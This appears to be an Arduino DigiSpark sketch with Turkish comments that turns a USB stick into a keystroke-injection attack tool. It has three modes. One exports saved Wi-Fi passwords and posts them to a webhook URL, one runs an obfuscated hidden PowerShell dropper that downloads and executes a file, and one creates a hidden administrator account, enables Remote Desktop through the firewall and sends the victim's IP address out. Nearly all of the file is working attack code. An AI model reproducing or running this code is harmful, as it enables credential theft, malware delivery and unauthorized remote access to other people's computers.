#define kbd_tr_tr // Tr klavye uyumlamak 
#include "DigiKeyboard.h" // Kütüphane zımbırtısı
#define KEY_TAB 0x2b // Tab Tuşunun Kodu
int c = 0;
bool x ;
int buton = 5;
int mavi = 0;
int yesil = 1;
int kirmizi = 2;
int buton2 = 3 ;
void setup() {
  Serial.begin(9600);
  pinMode(buton,INPUT);
  pinMode(mavi,OUTPUT);
  pinMode(yesil,OUTPUT);
  pinMode(kirmizi,OUTPUT);
  pinMode(buton2,INPUT);
}

void loop() {

int butondeger2 = digitalRead(buton2);
if (butondeger2 == HIGH)
x = true ;
else
x = false;



int butondeger = digitalRead(buton);
if (butondeger==HIGH){
  c ++;
  delay(700);
  }
if(c>3){
  c=0;
  }




 
  
if(c==1)
digitalWrite(mavi,HIGH);
else
digitalWrite(mavi,LOW);



if(c==2)
digitalWrite(yesil,HIGH);
else
digitalWrite(yesil,LOW);



if(c==3)
digitalWrite(kirmizi,HIGH);
else
digitalWrite(kirmizi,LOW);

if (x == true){





  
//KAYITLI WİFİ ŞİFRE (MAVİ LED)
if (c == 1){
  

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(799);
 DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");//cmd'yi en küçük pencerede çalıştırır
// DigiKeyboard.print("cmd");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.println("cd %temp%");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.print("netsh wlan export profile key=clear");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
DigiKeyboard.delay(120);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
//DigiKeyboard.print("powershell Invoke-WebRequest -Uri https://discordapp.com/api/webhooks/1045779032958042175/-IPO3AzdLO-JjaXXN53shADlmoCAYUwhWsA7Z1FZJrqDM9hd2AukPVLEBxwG9Q0fh9jf -Method POST -InFile Wi-Fi-PASS");
DigiKeyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/a6a8d107-9a21-40f6-98c8-bb54d8d2edc6 -Method POST -InFile Wi-Fi-PASS");
DigiKeyboard.delay(200);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.print("del Wi-* /s /f /q"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  



    
} 
//İnternetten virüs indirtip çalıştırma(YEŞİL LED)
if (c == 2){
   DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // çalıştır
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://miro.medium.com/max/1000/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg\\\",\\\"$env:UserProfile\\desktop\\catz.jpeg\\\");in'v'oke-item $env:UserProfile\\desktop\\catz.jpeg")); //Payload Dropper
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // program bittiğinde yeşil ledi yak
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
  
  }
// UZAK MASAÜSTÜ BAĞLANTISI (KIRMIZI LED) 
if (c == 3 ){






   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr"); // Görev Yöneticisini Çalıştır
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N); // Çalıştır
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1"); // cmd'yi Çalıştır
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Yönetici Ayrıcalıklarını Aç
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Çalıştır
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F "); // Görev Yöneticisini Kapatma
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("net user blanka Ping@123 /ADD"); // Kullanıcı Ekleme
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup Administrators blanka /ADD"); // Kullanıcıyı Yönetici Grubuna Ekleme
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f")); // Kullanıcıyı giriş ekranından gizleme
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f")); // Uzak Masaüstünü Açma
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes")); // Güvenlik duvarı üzerinden uzak masaüstüne izin verme
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add"); // Oluşturulan kullanıcıyı Uzak Masaüstü grubuna ekleme
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit"); // Çıkış Yap
  DigiKeyboard.delay(500);
  
  // PowerShell komutunu çalıştırarak IP adresini Webhook'a gönder (WEBHOOK SİTESİNE KAYDOLUP WEBHOOK URLSİ ALIN YOKSA IP ADRESİ SİZE GELMEZ )
  DigiKeyboard.println("powershell Invoke-RestMethod -Uri https://webhook.site/a6a8d107-9a21-40f6-98c8-bb54d8d2edc6 -Method Post -Body @{ \"ip\" = (Invoke-WebRequest -Uri \"http://api.ipify.org\").Content } -ContentType \"application/x-www-form-urlencoded\"");
  DigiKeyboard.delay(500);
  
  digitalWrite(1, HIGH); // Program Bittiğinde Kırmızı Ledi Yak
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}


  
  }









  
}
